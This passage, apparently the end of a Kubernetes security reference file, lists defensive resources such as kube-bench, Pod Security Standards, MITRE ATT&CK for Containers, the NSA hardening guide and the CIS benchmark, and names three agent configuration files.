  - kube-bench (8k stars): [github.com/aquasecurity/kube-bench](https://github.com/aquasecurity/kube-bench) — CIS Benchmark checker
- **External resources**:
  - Kubernetes Security Documentation: [kubernetes.io/docs/concepts/security](https://kubernetes.io/docs/concepts/security)
  - Pod Security Standards: [kubernetes.io/docs/concepts/security/pod-security-standards](https://kubernetes.io/docs/concepts/security/pod-security-standards)
  - MITRE ATT&CK for Containers: [attack.mitre.org/matrices/enterprise/containers](https://attack.mitre.org/matrices/enterprise/containers)
  - NSA Kubernetes Hardening Guide (2022): [media.defense.gov/.../Kubernetes_Hardening_Guidance_1.2_20220915.pdf](https://media.defense.gov/2022/Aug/29/2003066362/-1/-1/0/CTR_KUBERNETES_HARDENING_GUIDANCE_1.2_20220915.PDF)
  - CIS Kubernetes Benchmark: [cisecurity.org/benchmark/kubernetes](https://www.cisecurity.org/benchmark/kubernetes)
  - Kubernetes CVE feed: [cve.mitre.org/.../kubernetes](https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=kubernetes)
  - Aqua Security blog: [blog.aquasec.com](https://blog.aquasec.com) — ongoing K8s vuln analysis
  - Ian Coldwater / Brad Geesaman / Duffie Cooley talks — K8s red team
- **Core system files**: `SOUL.md`, `TOOLS.md`, `IDENTITY.md`
